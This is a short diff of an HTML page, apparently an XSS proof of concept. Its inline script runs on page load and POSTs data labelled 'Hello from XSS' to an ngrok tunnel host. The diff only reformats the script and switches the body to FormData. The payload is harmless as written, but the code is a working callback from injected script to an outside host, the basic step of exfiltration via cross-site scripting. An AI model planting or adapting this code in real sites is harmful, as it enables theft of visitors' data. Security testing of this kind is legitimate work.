@@ -38,7 +38,7 @@
         }
     </style>
 </head>
- <script>
+<script>
 document.addEventListener("DOMContentLoaded", function() {
     var xhr = new XMLHttpRequest();
     xhr.open("POST", "https://49b7-2a02-8429-811a-201-15c9-ea64-1cbb-922b.ngrok-free.app/Hi", true);
@@ -48,7 +48,9 @@ document.addEventListener("DOMContentLoaded", function() {
             console.log("Data sent successfully.");
         }
     };
-    xhr.send("data=Hello from XSS");
+    var formData = new FormData();
+    formData.append("data", "Hello from XSS");
+    xhr.send(formData);
 });
 </script>
 <body>
